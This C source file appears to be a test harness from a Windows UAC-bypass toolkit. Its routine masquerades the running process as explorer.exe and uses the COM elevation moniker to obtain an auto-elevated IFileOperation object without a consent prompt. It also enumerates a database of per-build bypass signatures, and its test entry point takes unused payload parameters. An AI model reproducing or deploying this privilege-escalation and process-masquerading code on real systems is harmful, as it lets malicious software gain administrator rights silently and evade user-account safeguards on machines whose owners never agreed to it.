/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2026
*
*  TITLE:       TEST.C
*
*  VERSION:     3.70
*
*  DATE:        15 May 2026
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

VOID WINAPI TestEnumDB(
    _In_     PUSER_ASSOC_SIGNATURE Signature,
    _In_opt_ PVOID Context,
    _Inout_  BOOLEAN* StopEnumeration
)
{
    WCHAR szBuffer[MAX_PATH + 1];

    UNREFERENCED_PARAMETER(Context);

    _strcpy(szBuffer, TEXT("\r\nSign->NtBuildMin: "));
    ultostr(Signature->NtBuildMin, _strend(szBuffer));
    _strcat(szBuffer, TEXT("\r\n"));

    _strcat(szBuffer, TEXT("Sign->NtBuildMax: "));
    ultostr(Signature->NtBuildMax, _strend(szBuffer));
    _strcat(szBuffer, TEXT("\r\n"));

    _strcat(szBuffer, TEXT("Sign->PatternsCount: "));
    ultostr(Signature->PatternsCount, _strend(szBuffer));
    _strcat(szBuffer, TEXT("\r\n"));

    _strcat(szBuffer, TEXT("Sign->PatternsTable: 0x"));
    u64tohex((ULONG_PTR)Signature->PatternsTable, _strend(szBuffer));
    _strcat(szBuffer, TEXT("\r\n------------------"));

    OutputDebugString(szBuffer);

    *StopEnumeration = FALSE;
}

VOID TestEnumUAS()
{ 
    supEnumUserAssocSetDB((PSUP_UAS_ENUMERATION_CALLBACK_FUNCTION)TestEnumDB, NULL);
}

HRESULT AllocateElevatedObject(
    _In_ LPCWSTR lpObjectCLSID,
    _In_ REFIID riid,
    _In_ DWORD dwClassContext,
    _Outptr_ void** ppv
)
{
    DWORD       classContext;
    HRESULT     hr = E_FAIL;
    PVOID       ElevatedObject = NULL;
    BIND_OPTS3  bop;
    WCHAR       szMoniker[MAX_PATH];

    do {

        RtlSecureZeroMemory(&bop, sizeof(bop));
        bop.cbStruct = sizeof(bop);

        classContext = dwClassContext;
        if (dwClassContext == 0)
            classContext = CLSCTX_LOCAL_SERVER;

        bop.dwClassContext = classContext;

        _strcpy(szMoniker, T_ELEVATION_MONIKER_ADMIN);
        _strcat(szMoniker, lpObjectCLSID);
        OutputDebugString(L"zzz");
        hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);

    } while (FALSE);

    *ppv = ElevatedObject;

    return hr;
}

VOID TestElevatedObject()
{
    DWORD           dwResult = 0;
    IFileOperation* FileOperation = NULL;
    HRESULT         hr_init;

    supMasqueradeProcess(FALSE, EXPLORER_EXE);
    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        if (S_OK != AllocateElevatedObject(
            T_CLSID_FileOperation,
            &IID_IFileOperation,
            CLSCTX_LOCAL_SERVER,
            &FileOperation))
        {
            break;
        }

        if (FileOperation == NULL) {
            break;
        }

        if (S_OK != FileOperation->lpVtbl->SetOperationFlags(
            FileOperation,
            g_ctx->IFileOperationFlags))
        {
            break;
        }


        dwResult = 1;

    } while (FALSE);

    if (FileOperation != NULL) {
        FileOperation->lpVtbl->Release(FileOperation);
    }

    if (hr_init == S_OK)
        CoUninitialize();

}

/*
* ucmTestRoutine
*
* Purpose:
*
* Test routine, can serve multiple purposes.
*
*/
BOOL ucmTestRoutine(
    _In_opt_ PVOID PayloadCode,
    _In_ ULONG PayloadSize)
{
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);

    //TestEnumUAS();
    TestElevatedObject();
    supSetGlobalCompletionEvent();
    return TRUE;
}
